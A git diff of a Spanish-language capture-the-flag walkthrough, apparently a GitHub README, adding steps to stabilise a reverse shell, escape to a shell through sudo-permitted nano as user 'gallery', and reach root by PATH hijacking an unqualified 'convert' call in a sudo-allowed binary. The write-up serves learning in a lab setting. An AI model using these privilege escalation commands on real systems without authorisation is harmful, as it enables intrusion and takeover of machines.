@@ -34,10 +34,11 @@ Si entramos al archivo escuchando en el puerto 443 con `nc -lvnp 443` habremos a
 ## Paso N4: Accediendo a usuarios
 Ya dentro del sistema, empezaremos tratando la terminal.
 ```
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+script /dev/null -c bash
 Ctrl+Z
 stty raw -echo; fg
 export TERM=xterm
+export SHELL=bash
 ```
 Una vez tratada, ejecutaremos `sudo -l` y encontraremos `(gallery) NOPASSWD: /bin/nano`
 <img width="572" height="174" alt="image" src="https://github.com/user-attachments/assets/eacedecf-628b-47ad-acdd-eb1d99b11da1" />
@@ -48,9 +49,35 @@ sudo -u gallery /bin/nano
 Ctrl+R Ctrl+X
 reset; sh 1>&0 2>&0
 ```
-Y habremos obtenido acceso al usuario `gallery`
+Y habremos obtenido acceso al usuario `gallery`, opcional volver a ejecutar `script /dev/null -c bash`
 
 ## Paso N5: Escalando privilegios
 Si ejecutamos `sudo -l` estando en el usuario `gallery` veremos `(ALL) NOPASSWD: /usr/local/bin/runme`
 <img width="561" height="124" alt="image" src="https://github.com/user-attachments/assets/a03a2946-9b39-4c57-925d-d7f1418968ef" />
+
+Ejecutamos
+```
+strings /usr/local/bin/runme
+```
+Y veremos que se esta ejecutando
+```
+convert /var/www/html/gallery/uploads/images/input.png /var/www/html/gallery/uploads
+```
+<img width="672" height="423" alt="image" src="https://github.com/user-attachments/assets/f6a531f9-e1bf-4309-99db-90cb2f318322" />
+
+Esta llamando el binario `convert` sin ruta absoluta, por lo que podremos realizar un **PATH hijacking** ejecutando los siguientes comandos:
+```
+cd /home/gallery
+echo '/bin/bash' > convert
+chmod +x convert
+export PATH=.:$PATH
+```
+
+**Explicación:** Básicamente, como el binario `convert` no especifica ruta absoluta en su ejecución, podemos ejecutar comandos haciendose pasar por el binario `convert`. `PATH` es la lista de carpetas donde el sistema busca ejecutables (en este caso nuestro `/usr/local/bin/runme`) y al poner `.$PATH` basicamente está buscando el ejecutable en carpeta actual, en este caso `convert`.
+
+Ya una vez sobreescrito el binario `convert` ejecutamos `sudo /usr/local/bin/runme`
+<img width="436" height="87" alt="image" src="https://github.com/user-attachments/assets/53336003-ec03-4a71-b1db-6c7a6726cc47" />
+
+Y finalmente, seremos usuarios root.
+
 
